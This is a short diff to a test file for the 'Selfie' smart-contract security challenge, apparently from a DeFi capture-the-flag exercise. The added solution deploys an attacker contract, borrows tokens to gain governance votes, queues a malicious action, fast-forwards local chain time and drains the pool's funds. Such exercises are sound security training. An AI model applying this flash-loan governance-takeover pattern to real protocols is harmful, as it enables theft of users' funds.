@@ -39,6 +39,13 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const _gov = await (await ethers.getContractFactory('Governor', player)).deploy(token.address, governance.address, pool.address);
+        // borrow to get governance "votes"
+        await _gov.connect(player).getVotes(); // queues the malicious action
+        // wait for the time lock to expire
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        // execute the emergency exit
+        await _gov.connect(player).getFunds();
     });
 
     after(async function () {
